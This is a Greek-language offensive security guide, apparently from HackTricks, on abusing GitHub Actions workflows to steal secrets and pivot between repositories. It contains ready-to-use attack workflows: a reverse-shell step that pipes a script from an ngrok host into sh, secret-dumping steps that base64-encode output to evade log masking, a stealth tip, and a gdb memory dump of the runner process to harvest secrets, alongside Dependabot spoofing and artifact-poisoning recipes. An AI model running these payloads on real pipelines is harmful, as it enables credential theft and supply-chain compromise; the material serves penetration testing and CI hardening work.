# Κατάχρηση Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Εργαλεία

Τα παρακάτω εργαλεία είναι χρήσιμα για να βρείτε Github Action workflows και ακόμη να εντοπίσετε ευάλωτα:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Ελέγξτε επίσης το checklist του σε [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Βασικές πληροφορίες

Σε αυτή τη σελίδα θα βρείτε:

- Μια **περίληψη όλων των επιπτώσεων** όταν ένας επιτιθέμενος καταφέρνει να αποκτήσει πρόσβαση σε ένα Github Action
- Διαφορετικοί τρόποι για να **αποκτήσετε πρόσβαση σε ένα action**:
- Έχοντας **permissions** για να δημιουργήσετε το action
- Κατάχρηση ενεργοποιήσεων σχετικών με **pull request**
- Κατάχρηση **άλλων τεχνικών εξωτερικής πρόσβασης**
- **Pivoting** από ένα ήδη παραβιασμένο repo
- Τέλος, μια ενότητα για **post-exploitation τεχνικές για κατάχρηση ενός action από μέσα** (προκαλώντας τις αναφερόμενες επιπτώσεις)

## Περίληψη Επιπτώσεων

Για εισαγωγή στα [**Github Actions δείτε τις βασικές πληροφορίες**](../basic-github-information.md#github-actions).

Εάν μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε GitHub Actions** εντός ενός **repository**, ενδέχεται να μπορείτε να:

- **Κλέψετε secrets** που είναι προσαρτημένα στο pipeline και **καταχραστείτε τα προνόμια του pipeline** για να αποκτήσετε μη εξουσιοδοτημένη πρόσβαση σε εξωτερικές πλατφόρμες, όπως AWS και GCP.
- **Compromise deployments** και άλλα **artifacts**.
- Εάν το pipeline αναπτύσσει ή αποθηκεύει assets, θα μπορούσατε να αλλοιώσετε το τελικό προϊόν, επιτρέποντας μια supply chain attack.
- **Εκτελέσετε κώδικα σε custom workers** για να καταχραστείτε υπολογιστική ισχύ και να pivot σε άλλα συστήματα.
- **Αντικαταστήσετε τον κώδικα του repository**, ανάλογα με τα permissions που σχετίζονται με το `GITHUB_TOKEN`.

## GITHUB_TOKEN

Αυτό το "**secret**" (προερχόμενο από `${{ secrets.GITHUB_TOKEN }}` και `${{ github.token }}`) δίνεται όταν ο admin ενεργοποιεί αυτή την επιλογή:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Αυτό το token είναι το ίδιο που θα χρησιμοποιήσει μια **Github Application**, επομένως μπορεί να έχει πρόσβαση στα ίδια endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Το Github θα πρέπει να κυκλοφορήσει ένα [**flow**](https://github.com/github/roadmap/issues/74) που **επιτρέπει cross-repository** πρόσβαση εντός του GitHub, έτσι ώστε ένα repo να μπορεί να έχει πρόσβαση σε άλλα εσωτερικά repos χρησιμοποιώντας το `GITHUB_TOKEN`.

Μπορείτε να δείτε τα πιθανά **permissions** αυτού του token εδώ: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Σημειώστε ότι το token **λήγει μετά την ολοκλήρωση της εργασίας**.\
Αυτά τα tokens μοιάζουν ως εξής: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Μερικά ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό το token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Σημειώστε ότι σε αρκετές περιπτώσεις θα μπορείτε να βρείτε **github user tokens inside Github Actions envs or in the secrets**. Αυτά τα tokens μπορεί να σας δώσουν περισσότερα προνόμια στο αποθετήριο και στον οργανισμό.

<details>

<summary>Λίστα με secrets στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Απόκτηση reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατόν να ελέγξετε τα δικαιώματα που δίνονται σε ένα Github Token σε αποθετήρια άλλων χρηστών **ελέγχοντας τα logs** των actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπτή Εκτέλεση

> [!NOTE]
> Αυτός θα ήταν ο πιο εύκολος τρόπος για να παραβιάσετε τα Github actions, καθώς αυτή η περίπτωση υποθέτει ότι έχετε πρόσβαση να **create a new repo in the organization**, ή έχετε **write privileges over a repository**.
>
> If you are in this scenario you can just check the [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Εκτέλεση από Δημιουργία Repo

Αν τα μέλη μιας οργάνωσης μπορούν να **create new repos** και μπορείτε να εκτελείτε Github actions, μπορείτε να **create a new repo and steal the secrets set at organization level**.

### Εκτέλεση από Νέο Branch

Αν μπορείτε να **create a new branch in a repository that already contains a Github Action** ρυθμισμένη, μπορείτε να την **modify**, να **upload** το περιεχόμενο και στη συνέχεια να **execute that action from the new branch**. Με αυτόν τον τρόπο μπορείτε να **exfiltrate repository and organization level secrets** (αλλά πρέπει να ξέρετε πώς ονομάζονται).

> [!WARNING]
> Οποιοσδήποτε περιορισμός που εφαρμόζεται μόνο μέσα στο workflow YAML (για παράδειγμα, `on: push: branches: [main]`, job conditionals, ή manual gates) μπορεί να επεξεργαστεί από collaborators. Χωρίς εξωτερική επιβολή (branch protections, protected environments, and protected tags), ένας contributor μπορεί να στρέψει ένα workflow να τρέξει στο branch του και να καταχραστεί mounted secrets/permissions.

Μπορείτε να κάνετε την τροποποιημένη action εκτελέσιμη **χειροκίνητα,** όταν δημιουργείται ένα **PR** ή όταν **some code is pushed** (ανάλογα πόσο θορυβώδεις θέλετε να είστε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Εκτέλεση από Fork

> [!NOTE]
> Υπάρχουν διαφορετικοί triggers που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **execute a Github Action of another repository**. Εάν αυτές οι δράσεις που μπορούν να ενεργοποιηθούν είναι κακώς διαμορφωμένες, ένας επιτιθέμενος θα μπορούσε να τις παραβιάσει.

### `pull_request`

Ο workflow trigger **`pull_request`** θα εκτελεί το workflow κάθε φορά που λαμβάνεται ένα pull request με μερικές εξαιρέσεις: από προεπιλογή, αν είναι η **πρώτη φορά** που συνεργάζεστε, κάποιος **maintainer** θα χρειαστεί να **εγκρίνει** την **εκτέλεση** του workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Εφόσον ο **προεπιλεγμένος περιορισμός** ισχύει για **συνεργάτες για πρώτη φορά**, θα μπορούσατε να συνεισφέρετε **διορθώνοντας ένα έγκυρο bug/typo** και στη συνέχεια να στείλετε **άλλα PRs για να καταχραστείτε τα νέα σας `pull_request` privileges**.
>
> **Το δοκίμασα και δεν λειτουργεί**: ~~Μια άλλη επιλογή θα ήταν να δημιουργήσετε έναν λογαριασμό με το όνομα κάποιου που συνέβαλε στο έργο και να διαγράψετε τον λογαριασμό του.~~

Επιπλέον, από προεπιλογή **αποτρέπει τα write permissions** και την **secrets access** στο target repository όπως αναφέρεται στα [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **τα secrets δεν μεταβιβάζονται στον runner** όταν ένα workflow ενεργοποιείται από ένα **forked** repository. Το **`GITHUB_TOKEN` έχει δικαιώματα μόνο για ανάγνωση** σε pull requests **από forked repositories**.

Ένας επιτιθέμενος θα μπορούσε να τροποποιήσει τον ορισμό του Github Action ώστε να εκτελέσει αυθαίρετες ενέργειες και να προσθέσει αυθαίρετα actions. Ωστόσο, δεν θα μπορέσει να κλέψει secrets ή να αντικαταστήσει το repo λόγω των προαναφερθέντων περιορισμών.

> [!CAUTION]
> **Ναι, αν ο επιτιθέμενος αλλάξει στο PR το github action που θα ενεργοποιηθεί, το Github Action του θα είναι αυτό που θα χρησιμοποιηθεί και όχι αυτό από το αρχικό repo!**

Εφόσον ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμη και αν δεν υπάρχουν secrets ή write permissions για το `GITHUB_TOKEN`, ένας επιτιθέμενος θα μπορούσε για παράδειγμα να **upload malicious artifacts**.

### **`pull_request_target`**

Ο workflow trigger **`pull_request_target`** έχει **write permission** στο target repository και **πρόσβαση σε secrets** (και δεν ζητάει έγκριση).

Σημειώστε ότι ο workflow trigger **`pull_request_target`** **τρέχει στο base context** και όχι σε αυτό που παρέχεται από το PR (ώστε να **μην εκτελεστεί μη αξιόπιστος κώδικας**). Για περισσότερες πληροφορίες σχετικά με το `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτήν τη συγκεκριμένη επικίνδυνη χρήση ελέγξτε αυτήν την [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή το **εκτελούμενο workflow** είναι αυτό που ορίζεται στο **base** και **όχι στο PR**, είναι **ασφαλές** να χρησιμοποιηθεί το **`pull_request_target`**, αλλά υπάρχουν **λίγες περιπτώσεις όπου αυτό δεν ισχύει**.

Και αυτό (το trigger) θα έχει **πρόσβαση σε secrets**.

### `workflow_run`

Ο [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger επιτρέπει να τρέξει ένα workflow από ένα διαφορετικό όταν αυτό είναι `completed`, `requested` ή `in_progress`.

Σε αυτό το παράδειγμα, ένα workflow έχει ρυθμιστεί να τρέχει αφού ολοκληρωθεί το ξεχωριστό "Run Tests" workflow:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Επιπλέον, σύμφωνα με την τεκμηρίωση: Το workflow που ξεκινάται από το `workflow_run` event μπορεί να **έχει πρόσβαση σε secrets και να γράφει tokens, ακόμα και αν το προηγούμενο workflow δεν είχε**.

Αυτός ο τύπος workflow μπορεί να δεχτεί επίθεση αν εξαρτάται από ένα **workflow** που μπορεί να **προκληθεί** από έναν εξωτερικό χρήστη μέσω των **`pull_request`** ή **`pull_request_target`**. Ένα ζευγάρι ευάλωτων παραδειγμάτων μπορούν να [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Το πρώτο αφορά το workflow που ενεργοποιείται από το **`workflow_run`** και κατεβάζει τον κώδικα του επιτιθέμενου: `${{ github.event.pull_request.head.sha }}`\
Το δεύτερο αφορά στο **passing** ενός **artifact** από τον **μη αξιόπιστο** κώδικα στο **`workflow_run`** workflow και στη χρήση του περιεχομένου αυτού του artifact με τρόπο που το καθιστά **ευάλωτο σε RCE**.

### `workflow_call`

TODO

TODO: Ελέγξτε αν όταν εκτελείται από ένα pull_request, ο χρησιμοποιούμενος/κατεβασμένος κώδικας είναι από το origin ή από το forked PR

## Κατάχρηση Εκτέλεσης από Forks

Έχουμε αναφέρει όλους τους τρόπους με τους οποίους ένας εξωτερικός επιτιθέμενος μπορεί να καταφέρει να εκτελέσει ένα github workflow. Τώρα ας δούμε πώς αυτές οι εκτελέσεις, αν είναι λανθασμένα διαμορφωμένες, μπορούν να καταχραστούν:

### Εκτέλεση μη αξιόπιστου checkout

Στην περίπτωση του **`pull_request`,** το workflow θα εκτελεστεί στο **context του PR** (οπότε θα εκτελέσει τον **κακόβουλο κώδικα του PR**), αλλά κάποιος πρέπει πρώτα να **εξουσιοδοτήσει** και θα τρέξει με ορισμένους [περιορισμούς](#pull_request).

Στην περίπτωση ενός workflow που χρησιμοποιεί **`pull_request_target` or `workflow_run`** και εξαρτάται από ένα workflow που μπορεί να προκληθεί από **`pull_request_target` or `pull_request`**, θα εκτελεστεί ο κώδικας του αρχικού repo, οπότε ο **επιτιθέμενος δεν μπορεί να ελέγξει τον εκτελούμενο κώδικα**.

> [!CAUTION]
> Ωστόσο, αν η **action** έχει ένα **explicit PR checkou**t που θα **πάρει τον κώδικα από το PR** (και όχι από το base), θα χρησιμοποιήσει τον κώδικα που ελέγχει ο επιτιθέμενος. Για παράδειγμα (έλεγξε τη γραμμή 12 όπου γίνεται το κατέβασμα του κώδικα του PR):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

> [!WARNING]
> Ένα github dork για αναζήτηση ευάλωτων actions είναι: `event.pull_request pull_request_target extension:yml` ωστόσο, υπάρχουν διαφορετικοί τρόποι να διαμορφωθούν τα jobs ώστε να εκτελούνται με ασφάλεια ακόμη και αν η action είναι διαμορφωμένη ανασφαλώς (π.χ. χρησιμοποιώντας conditionals σχετικά με το ποιος είναι ο actor που δημιουργεί το PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Σημειώστε ότι υπάρχουν ορισμένα [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) των οποίων οι τιμές είναι **ελεγχόμενες** από τον **χρήστη** που δημιουργεί το PR. Αν το github action χρησιμοποιεί αυτά τα **δεδομένα για να εκτελέσει οτιδήποτε**, αυτό μπορεί να οδηγήσει σε **αυθαίρετη εκτέλεση κώδικα:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Από την τεκμηρίωση: Μπορείτε να κάνετε μια **μεταβλητή περιβάλλοντος διαθέσιμη σε οποιαδήποτε επόμενα βήματα** σε ένα workflow job ορίζοντάς την ή ενημερώνοντάς την και γράφοντάς την στο αρχείο περιβάλλοντος **`GITHUB_ENV`**.

Αν ένας επιτιθέμενος μπορούσε να **εισάγει οποιαδήποτε τιμή** μέσα σε αυτή τη **μεταβλητή env**, θα μπορούσε να εισάγει μεταβλητές περιβάλλοντος που εκτελούν κώδικα σε επόμενα βήματα όπως **LD_PRELOAD** ή **NODE_OPTIONS**.

Για παράδειγμα ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), φανταστείτε ένα workflow που εμπιστεύεται ένα uploaded artifact για να αποθηκεύσει το περιεχόμενό του μέσα στη μεταβλητή περιβάλλοντος **`GITHUB_ENV`**. Ένας επιτιθέμενος θα μπορούσε να ανεβάσει κάτι σαν το παρακάτω για να το παραβιάσει:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Όπως αναφέρεται στο [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), αρκετές οργανώσεις έχουν ένα Github Action που συγχωνεύει οποιοδήποτε PRR από `dependabot[bot]` όπως στο:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- Fork the victim repository
- Add the malicious payload to your copy
- Enable Dependabot on your fork adding an outdated dependency. Dependabot will create a branch fixing the dependency with malicious code.
- Open a Pull Request to the victim repository from that branch (the PR will be created by the user so nothing will happen yet)
- Then, attacker goes back to the initial PR Dependabot opened in his fork and runs `@dependabot recreate`
- Then, Dependabot perform some actions in that branch, that modified the PR over the victim repo, which makes `dependabot[bot]` the actor of the latest event that triggered the workflow (and therefore, the workflow runs).

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Λοιπόν, το αρχικό blogpost προτείνει δύο επιλογές για να εκμεταλλευτείς αυτή τη συμπεριφορά, με τη δεύτερη να είναι:

- Fork το αποθετήριο-θύμα και ενεργοποιήστε το Dependabot με κάποια outdated dependency.
- Δημιουργήστε ένα νέο branch με τον κακόβουλο shell injeciton code.
- Αλλάξτε το default branch του repo σε αυτό.
- Δημιουργήστε ένα PR από αυτό το branch προς το αποθετήριο-θύμα.
- Τρέξτε `@dependabot merge` στο PR που άνοιξε το Dependabot στο fork του.
- Το Dependabot θα συγχωνεύσει τις αλλαγές του στο default branch του forked αποθετηρίου σας, ενημερώνοντας το PR στο αποθετήριο-θύμα και κάνοντας πλέον το `dependabot[bot]` τον actor του τελευταίου event που ενεργοποίησε το workflow, χρησιμοποιώντας ένα malicious branch name.

### Ευάλωτα Github Actions τρίτων

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Όπως αναφέρεται σε [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), αυτό το Github Action επιτρέπει την πρόσβαση σε artifacts από διαφορετικά workflows και ακόμη και repositories.

Το πρόβλημα είναι ότι αν η παράμετρος **`path`** δεν οριστεί, το artifact εξάγεται στον τρέχοντα κατάλογο και μπορεί να αντικαταστήσει αρχεία που ενδέχεται να χρησιμοποιηθούν αργότερα ή ακόμη και να εκτελεστούν στο workflow. Επομένως, αν το Artifact είναι ευάλωτο, ένας επιτιθέμενος θα μπορούσε να το εκμεταλλευτεί για να παραβιάσει άλλα workflows που εμπιστεύονται το Artifact.

Παράδειγμα ευάλωτου workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτό μπορεί να επιτεθεί με την εξής ροή εργασίας:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Άλλες Εξωτερικές Προσβάσεις

### Διαγραμμένο Namespace Repo Hijacking

Αν ένας account αλλάξει το όνομά του, άλλος χρήστης μπορεί να εγγράψει έναν account με αυτό το όνομα μετά από κάποιο χρόνο. Αν ένα repository είχε **λιγότερα από 100 stars πριν την αλλαγή ονόματος**, το Github θα επιτρέψει στον νέο εγγεγραμμένο χρήστη με το ίδιο όνομα να δημιουργήσει ένα **repository με το ίδιο όνομα** όπως αυτό που διαγράφηκε.

> [!CAUTION]
> Έτσι, αν ένα action χρησιμοποιεί ένα repo από έναν μη-υπάρχον account, εξακολουθεί να είναι πιθανό ένας attacker να δημιουργήσει αυτόν τον account και να compromise το action.

Αν άλλα repositories χρησιμοποιούσαν **dependencies από τα user repos αυτού του χρήστη**, ένας attacker θα μπορέσει να τα hijack. Εδώ έχετε μια πιο πλήρη εξήγηση: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Σε αυτή την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέψουν να **pivot from one repo to another** υποθέτοντας ότι έχουμε κάποιο είδος πρόσβασης στο πρώτο (δείτε την προηγούμενη ενότητα).

### Cache Poisoning

Ένα cache διατηρείται μεταξύ των **workflow runs στο ίδιο branch**. Αυτό σημαίνει ότι αν ένας attacker **compromise** ένα **package** που στη συνέχεια αποθηκεύεται στο cache και **downloaded** και εκτελείται από ένα **more privileged** workflow, θα μπορέσει επίσης να **compromise** και αυτό το workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows θα μπορούσαν να χρησιμοποιούν **artifacts from other workflows and even repos**, αν ένας attacker καταφέρει να **compromise** το Github Action που **uploads an artifact** το οποίο αργότερα χρησιμοποιείται από άλλο workflow, θα μπορούσε να **compromise** και τα άλλα workflows:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation από ένα Action

### Github Action Policies Bypass

Όπως αναφέρεται σε [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), ακόμα και αν ένα repository ή μια organization έχει policy που περιορίζει τη χρήση ορισμένων actions, ένας attacker μπορεί απλώς να κατεβάσει (`git clone`) μια action μέσα στο workflow και μετά να την αναφέρει ως local action. Εφόσον οι policies δεν επηρεάζουν τα local paths, **η action θα εκτελεστεί χωρίς κανέναν περιορισμό.**

Παράδειγμα:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Πρόσβαση σε AWS, Azure και GCP μέσω OIDC

Δείτε τις παρακάτω σελίδες:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/azure-security/az-basic-information/az-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Πρόσβαση σε secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Αν εισάγετε περιεχόμενο σε ένα script, είναι χρήσιμο να ξέρετε πώς μπορείτε να αποκτήσετε πρόσβαση σε secrets:

- Εάν το secret ή token έχει οριστεί ως **environment variable**, μπορεί να προσπελαστεί απευθείας από το environment χρησιμοποιώντας **`printenv`**.

<details>

<summary>Λίστα secrets στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Απόκτηση reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Αν το secret χρησιμοποιηθεί **άμεσα σε μια έκφραση**, το παραγόμενο shell script αποθηκεύεται **στον δίσκο** και είναι προσβάσιμο.
- ```bash
cat /home/runner/work/_temp/*
```
- Για JavaScript actions, τα secrets αποστέλλονται μέσω environment variables
- ```bash
ps axe | grep node
```
- Για ένα **custom action**, ο κίνδυνος μπορεί να διαφέρει ανάλογα με το πώς ένα πρόγραμμα χρησιμοποιεί το secret που απέκτησε από το **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Απαριθμήστε όλα τα secrets μέσω του secrets context (επίπεδο collaborator). Ένας contributor με write access μπορεί να τροποποιήσει ένα workflow σε οποιοδήποτε branch για να εξάγει όλα τα repository/org/environment secrets. Χρησιμοποιήστε διπλό base64 για να αποφύγετε το GitHub’s log masking και αποκωδικοποιήστε το τοπικά:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Αποκωδικοποιήστε το τοπικά:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Συμβουλή: για stealth κατά τη δοκιμή, κρυπτογραφήστε πριν την εκτύπωση (openssl είναι προεγκατεστημένο στους GitHub-hosted runners).

### Κατάχρηση Self-hosted runners

Ο τρόπος να βρείτε ποιες **Github Actions εκτελούνται σε υποδομή εκτός GitHub** είναι να ψάξετε για **`runs-on: self-hosted`** στο Github Action configuration yaml.

Οι **Self-hosted** runners μπορεί να έχουν πρόσβαση σε **επιπλέον ευαίσθητες πληροφορίες**, σε άλλα **network systems** (ευπαθή endpoints στο δίκτυο? metadata service?) ή, ακόμη κι αν είναι απομονωμένος και καταστραφεί, **περισσότερες από μία action μπορεί να εκτελούνται ταυτόχρονα** και η κακόβουλη θα μπορούσε να **κλέψει τα secrets** της άλλης.

Σε self-hosted runners είναι επίσης δυνατό να αποκτήσετε τα **secrets from the \_Runner.Listener**\_\*\* process\*\* που θα περιέχει όλα τα secrets των workflows σε οποιοδήποτε βήμα, dumpάροντας τη μνήμη του:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Δείτε [**αυτό το άρθρο για περισσότερες πληροφορίες**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Είναι δυνατό να δημιουργήσετε Github actions που θα **δημιουργούν και αποθηκεύουν ένα Docker image μέσα στο Github**. Ένα παράδειγμα θα το βρείτε στο παρακάτω αναδιπλούμενο:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως φαίνεται στον προηγούμενο κώδικα, το Github registry φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με read permissions στο repo θα μπορεί τότε να κατεβάσει το Docker Image χρησιμοποιώντας ένα personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Ευαίσθητες πληροφορίες στα Github Actions logs

